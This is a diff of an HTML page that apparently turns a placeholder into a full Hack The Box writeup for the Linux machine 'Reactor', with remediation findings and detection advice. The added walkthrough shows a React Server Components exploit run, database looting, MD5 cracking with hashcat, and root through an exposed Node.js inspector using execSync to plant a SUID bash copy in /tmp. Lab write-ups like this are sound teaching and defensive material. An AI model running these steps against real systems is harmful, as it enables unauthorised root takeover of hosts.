@@ -4,15 +4,11 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Reactor — HTB Writeup (Lanky)</title>
-  <meta name="description" content="Hack The Box: Reactor — Easy Linux. Next.js React Server Components RCE → root via exposed Node.js inspector.">
+  <meta name="description" content="Hack The Box: Reactor — Easy Linux. React Server Components RCE on a Next.js dashboard, SQLite loot and MD5 cracking for SSH, then root through a Node.js inspector left listening on 127.0.0.1:9229 by a root-owned process.">
   <link rel="stylesheet" href="../assets/style.css?v=5">
-  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127875;</text></svg>">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#9883;</text></svg>">
 </head>
 <body>
-  <div class="banner">
-    ◷ <strong>Active Season 11 box</strong> — full technical writeup publishes once the season closes. Summary &amp; lessons below.
-  </div>
-
   <header class="nav">
     <div class="wrap">
       <a class="brand" href="../index.html">lanky<span class="accent">.pwns</span></a>
@@ -24,65 +20,202 @@
     <a class="back" href="../index.html#lab">back to writeups</a>
     <img class="wu-logo" src="../assets/logos/reactor.png" alt="Reactor logo">
     <h1 style="margin-top:16px;">Reactor</h1>
-    <div class="subtitle">Hack The Box · <a href="https://app.hackthebox.com/machines/Reactor" target="_blank" rel="noopener">app.hackthebox.com/machines/Reactor</a></div>
+    <div class="subtitle">Hack The Box · <a href="https://app.hackthebox.com/machines/Reactor" target="_blank" rel="noopener">app.hackthebox.com/machines/Reactor</a> · Season 11</div>
     <div class="machine-meta">
       <span class="pill os-linux">Linux</span>
       <span class="pill diff-easy">Easy</span>
       <span class="pill season">Season 11</span>
       <span class="pill">Next.js RCE</span>
+      <span class="pill">Node inspector</span>
       <span class="pill flagp">User</span>
       <span class="pill flagp">Root</span>
       <span class="pill rooted">● Completed</span>
-      <span class="pill pending">writeup after season</span>
     </div>
 
     <div class="callout">
-      <span class="tag">Summary</span>
-      Reactor ran a <strong>Next.js</strong> dashboard ("ReactorWatch") on port 3000. A <strong>React Server
-      Components</strong> deserialization flaw gave remote command execution as <code>node</code>. The app's
-      SQLite database leaked an MD5 password hash that cracked and unlocked SSH. Root came from a
-      <strong>root-owned Node.js process exposing the V8 debug inspector</strong> on localhost — attach a
-      debugger, run code as root.
+      <span class="tag">TL;DR</span>
+      A modern web-to-root chain on an easy box. A <strong>Next.js</strong> dashboard exposed a
+      <strong>React Server Components</strong> deserialization issue giving remote command execution as the
+      <code>node</code> user. The application's SQLite database held MD5 password hashes; one cracked and gave
+      SSH as <code>engineer</code>. Root came from a root-owned Node.js uptime monitor running with
+      <code>--inspect</code> bound to <strong>127.0.0.1:9229</strong> — attaching to the debugger is command
+      execution inside a root process.
     </div>
 
-    <h2><span class="num">01</span>Why the full writeup is held back</h2>
+    <dl class="fact">
+      <dt>Target</dt><dd><b>reactor.htb</b> — "ReactorWatch Core Monitoring System"</dd>
+      <dt>Host OS</dt><dd>Linux</dd>
+      <dt>Foothold</dt><dd>React Server Components RCE (React2Shell-style) as <code>node</code></dd>
+      <dt>User</dt><dd>SQLite loot → MD5 crack → SSH as <code>engineer</code></dd>
+      <dt>Root</dt><dd>Node.js inspector on <code>127.0.0.1:9229</code> in a root process</dd>
+    </dl>
+
+    <h2><span class="num">01</span>Enumeration</h2>
+    <pre data-lang="bash"><code>nmap -sC -sV -p- &lt;target&gt;</code></pre>
+    <table>
+      <tr><th>Port</th><th>Service</th><th>Notes</th></tr>
+      <tr><td>22</td><td>ssh</td><td>OpenSSH</td></tr>
+      <tr><td>3000</td><td>http</td><td>Next.js — "ReactorWatch | Core Monitoring System", <code>X-Powered-By: Next.js</code></td></tr>
+    </table>
     <p>
-      Reactor is a live Season 11 machine, so — in line with Hack The Box's guidance on active machines — I'm not
-      publishing a step-by-step reproduction. The complete writeup (recon, the RSC RCE, DB looting &amp; hash
-      cracking, and the inspector privesc, with commands and remediation) goes live here <strong>once the season closes</strong>.
+      Two ports and a Next.js banner is already a strong steer. Route fuzzing does not reveal much here, because
+      the attack surface is not a route in the traditional sense — it is the React Server Components action
+      protocol.
     </p>
 
-    <h2><span class="num">02</span>The interesting bits (no spoilers)</h2>
-    <h3>Modern framework RCE — React Server Components</h3>
+    <h2><span class="num">02</span>Foothold — React Server Components RCE</h2>
     <p>
-      The foothold wasn't a classic web bug — it was a <strong>server-side deserialization / action-handling flaw
-      in React Server Components</strong> (the "React2Shell" class of issue), triggered through the framework's
-      server-action request handling. A good reminder that new rendering frameworks bring <em>new</em> server-side
-      attack surface, not just client-side.
+      Next.js server actions accept a serialized payload identified by the <code>Next-Action</code> header. A
+      React2Shell-style multipart POST abuses the deserialization of that payload to reach server-side command
+      execution — no authentication required, and nothing that looks like a normal endpoint.
     </p>
-    <h3>A debugger left open as root</h3>
+    <pre data-lang="bash"><code>python3 reactor2shell.py http://&lt;target&gt;:3000 id | tee reactor-rce-id.txt
+# 1:E{"digest":"uid=999(node) gid=988(node) groups=988(node)"}</code></pre>
     <p>
-      Privilege escalation came from a root-run Node.js uptime monitor started with <code>--inspect</code>, leaving
-      the <strong>V8 inspector listening on 127.0.0.1:9229</strong>. Anyone who can reach that local port can attach
-      a debugger and execute arbitrary code <em>in the context of the root process</em> — no exploit required.
+      Execution lands as the <code>node</code> service user. The response comes back inside the RSC error
+      <code>digest</code> field, which is a neat detail — the output channel is the framework's own error
+      serialisation.
     </p>
 
-    <h2><span class="num">03</span>Takeaways</h2>
+    <h2><span class="num">03</span>Post-exploitation loot</h2>
+    <p>With command execution, the application directory is the obvious first stop:</p>
+    <pre data-lang="text"><code>/opt/reactor-app/package.json
+/opt/reactor-app/.env
+/opt/reactor-app/reactor.db
+/opt/reactor-app/app/page.js
+/opt/uptime-monitor/worker.js      &lt;-- note this one for later</code></pre>
+    <p>The environment file gives the database location and some internal configuration:</p>
+    <pre data-lang="text"><code>DB_PATH=/opt/reactor-app/reactor.db
+DB_TYPE=sqlite3
+SENSOR_API_KEY=&lt;redacted&gt;
+ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook
+NODE_ENV=production</code></pre>
+    <p>
+      The SQLite database has <code>users</code> and <code>sensor_logs</code> tables; <code>users</code> stores
+      bare <strong>MD5</strong> hashes with no salt.
+    </p>
+    <pre data-lang="bash"><code>hashcat -m 0 engineer.hash /usr/share/wordlists/rockyou.txt</code></pre>
+    <p>
+      The <code>engineer</code> hash falls to rockyou immediately, and the password is reused for SSH — the
+      bridge from web access to system access.
+    </p>
+    <pre data-lang="bash"><code>ssh engineer@&lt;target&gt;</code></pre>
+    <div class="flag"><span class="label">user.txt</span>&lt;redacted&gt;</div>
+
+    <h2><span class="num">04</span>Root — a debugger left open</h2>
+    <p><code>engineer</code> has no sudo rights, but process enumeration finds the real issue:</p>
+    <pre data-lang="bash"><code>sudo -l          # user engineer may not run sudo on reactor
+ps auxww | grep -- '--inspect'
+# root 1420 ... /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
+ss -lntup | grep 9229
+# LISTEN 0 511 127.0.0.1:9229</code></pre>
+    <p>
+      The Node.js inspector is a full debugging interface: anyone who can connect to it can evaluate arbitrary
+      JavaScript <em>inside that process</em>. The process is root, so the debugger is a root shell with extra
+      steps. Binding it to localhost is not a control — any local user can reach localhost.
+    </p>
+    <pre data-lang="bash"><code>node inspect 127.0.0.1:9229
+# connecting to 127.0.0.1:9229 ... ok
+
+debug&gt; exec("process.mainModule.require('child_process').execSync('id').toString()")
+# 'uid=0(root) gid=0(root) groups=0(root)\n'</code></pre>
+    <p>Confirm root execution first with <code>id</code>, then build something stable:</p>
+    <pre data-lang="bash"><code>debug&gt; exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/rootbash').toString()")
+debug&gt; exec("process.mainModule.require('child_process').execSync('chmod 4755 /tmp/rootbash').toString()")
+
+engineer@reactor:~$ /tmp/rootbash -p
+rootbash-5.2# id
+# uid=1000(engineer) euid=0(root)</code></pre>
+    <div class="flag"><span class="label">root.txt</span>&lt;redacted&gt;</div>
+
+    <h2><span class="num">05</span>If this were your environment</h2>
+
+    <div class="finding">
+      <span class="tag">Finding 1 · Critical</span>
+      <h4>Node.js inspector enabled on a root-owned production process</h4>
+      <p>
+        <code>--inspect=127.0.0.1:9229</code> on a root process gives every local user arbitrary code execution
+        as root. The localhost bind limits remote access but does nothing once an attacker has any local shell —
+        which the web RCE already provided.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Remove <code>--inspect</code> / <code>--inspect-brk</code> from production service definitions.</strong> This is the primary fix; firewalling the port is secondary.</li>
+        <li><strong>Do not run application or monitoring processes as root.</strong> Give the uptime monitor its own service account with only what it needs.</li>
+        <li><strong>Harden the unit:</strong>
+          <code>User=</code>, <code>Group=</code>, <code>NoNewPrivileges=true</code>, <code>PrivateTmp=true</code>,
+          <code>ProtectSystem=strict</code>, <code>ProtectHome=true</code>,
+          <code>RestrictAddressFamilies=AF_INET AF_UNIX</code>.</li>
+        <li><strong>Monitor for debug flags and port 9229</strong> across the estate as a standing check.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> CM-7 least functionality (disable debug interfaces) · AC-6 least privilege · CM-6 configuration settings · SC-7 boundary protection<br>
+        <b>CIS Controls v8:</b> 4.x secure configuration · 4.8 disable unnecessary services
+      </div>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 2 · Critical</span>
+      <h4>Unauthenticated RCE through React Server Components</h4>
+      <p>
+        The Next.js server-action deserialization path allowed command execution as the application user with no
+        authentication, through a mechanism ordinary route enumeration never surfaces.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Patch Next.js and React</strong> to versions with the server-action deserialization fix, and track those advisories actively — this class is young and moving.</li>
+        <li><strong>Run the app as a confined, non-privileged user</strong> in a container or hardened unit, so RCE in the framework is not a foothold on the host.</li>
+        <li><strong>Include framework-native protocols in test scope</strong> — server actions, RSC payloads, tRPC and similar are attack surface that path-based scanning misses.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> SI-2 flaw remediation · SI-10 input validation · AC-6 least privilege · RA-5 vulnerability scanning
+      </div>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 3 · High</span>
+      <h4>Unsalted MD5 password hashes, reused for SSH</h4>
+      <p>
+        The application stored bare MD5 hashes, and the recovered password also worked for the operating system
+        account — turning an application compromise into interactive host access.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Store passwords with a modern KDF</strong> — argon2id or bcrypt with a per-user salt. MD5 is not a password hash.</li>
+        <li><strong>Separate application identities from OS identities.</strong> An app user should never share a credential with a shell account.</li>
+        <li><strong>Keep the database off the app server</strong> where practical, and restrict its file permissions from the web process.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> IA-5 authenticator management · SC-28 protection of information at rest · AC-2 account management<br>
+        <b>CWE:</b> CWE-916 use of password hash with insufficient computational effort
+      </div>
+    </div>
+
+    <h2><span class="num">06</span>Detection — the blue-team side</h2>
     <ul>
-      <li><strong>Treat framework internals as attack surface</strong> — RSC / server actions need the same input-trust scrutiny as any endpoint.</li>
-      <li><strong>Never leave a debug inspector on a privileged process</strong> — <code>--inspect</code> on a root service is remote code execution to anyone on localhost.</li>
-      <li><strong>App databases are credential stores to an attacker</strong> — unsalted MD5 hashes crack instantly; salt + slow hashes, and don't reuse DB passwords for SSH.</li>
-      <li>The same lessons I apply defensively: monitor for debug ports, audit service launch flags, and treat every reachable local port as a trust boundary.</li>
+      <li><strong>Node inspector listeners in production</strong> — alert on any process with <code>--inspect</code> or a listener on 9229.</li>
+      <li><strong>The web service user spawning shells</strong> or reading the application database outside normal query paths.</li>
+      <li><strong>New SUID binaries</strong>, particularly copies of shells in <code>/tmp</code>.</li>
+      <li><strong>SSH logins for accounts whose passwords also exist in an application database</strong> — worth correlating once, then fixing.</li>
     </ul>
 
-    <div class="callout todo">
-      <span class="tag">Coming after Season 11</span>
-      Full technical walkthrough with the exact RCE chain, DB extraction, cracking, and the inspector-to-root steps.
-    </div>
+    <h2><span class="num">07</span>Takeaways</h2>
+    <ul>
+      <li><strong>Modern JavaScript stacks create real server-side attack surface.</strong> "It's a React app" does not mean the interesting bugs are in the browser.</li>
+      <li><strong>Application databases are the bridge</strong> from web compromise to system access — they are where credentials that work elsewhere live.</li>
+      <li><strong>Debug interfaces are remote code execution with a friendly name.</strong> On a root process, a localhost bind buys you nothing.</li>
+      <li><strong>Confirm privileged execution with <code>id</code> before building a shell.</strong> Cheap proof first, payload second.</li>
+    </ul>
 
     <p style="margin-top:40px;"><a class="back" href="../index.html#lab">back to writeups</a></p>
   </article>
 
-  <footer><div class="wrap">Reactor · completed · Lanky &nbsp;·&nbsp; <a href="../index.html#lab">all writeups</a></div></footer>
+  <footer><div class="wrap">Reactor · Season 11 · completed · Lanky &nbsp;·&nbsp; <a href="../index.html#lab">all writeups</a></div></footer>
 </body>
 </html>
